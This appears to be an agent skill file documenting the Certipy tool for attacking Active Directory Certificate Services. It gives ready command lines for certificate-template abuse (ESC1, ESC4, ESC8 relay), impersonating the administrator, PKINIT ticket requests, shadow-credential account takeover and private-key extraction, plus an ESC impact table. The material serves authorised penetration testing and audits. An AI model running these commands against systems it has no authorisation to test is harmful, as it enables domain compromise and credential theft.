---
name: certipy-cli
description: "Certipy — аудит инфраструктуры сертификатов Active Directory (ADCS): ESC1–ESC16, теневые учётные данные, PKINIT. Расположен: ~/.local/bin/certipy."
allowed-tools: Bash(certipy *), Read
---

# certipy-cli

Binary: `$CERTIPY_BIN`

## Key invocations

```bash
# Find vulnerable templates and CAs
certipy find -u user@domain.local -p 'Password' -dc-ip <dc-ip> -vulnerable -stdout

# ESC1 — enroll cert as another user (UPN SAN)
certipy req -u user@domain.local -p 'Password' -dc-ip <dc-ip> \
  -ca 'CA-Name' -template 'VulnTemplate' -upn administrator@domain.local

# ESC4 — write access to template (modify then enroll)
certipy template -u user@domain.local -p 'Password' -dc-ip <dc-ip> \
  -template 'TargetTemplate' -save-old
certipy req -u user@domain.local -p 'Password' -dc-ip <dc-ip> \
  -ca 'CA-Name' -template 'TargetTemplate' -upn administrator@domain.local

# Authenticate with certificate (PKINIT → TGT)
certipy auth -pfx administrator.pfx -dc-ip <dc-ip>

# Shadow credentials (machine account takeover)
certipy shadow auto -u user@domain.local -p 'Password' -dc-ip <dc-ip> -account 'TARGET$'

# Dump from local cert store
certipy cert -pfx user.pfx -nocert -out user.key
certipy cert -pfx user.pfx -nokey -out user.crt

# Relay (ESC8 — NTLM relay to HTTP enrollment endpoint)
certipy relay -target http://<ca-host>/certsrv/certfnsh.asp -ca 'CA-Name' -template 'DomainController'
```

## ESC cheatsheet

| ESC | Condition | Impact |
|---|---|---|
| ESC1 | Low-priv enroll + UPN SAN | Impersonate any user |
| ESC2 | Any Purpose EKU | Any cert use |
| ESC3 | Certificate Request Agent EKU | Enroll on behalf of any user |
| ESC4 | Write ACL on template | Modify then ESC1 |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | SAN on any template |
| ESC7 | ManageCA right | Enable ESC6 |
| ESC8 | HTTP enrollment + NTLM auth | Relay to get DC cert |
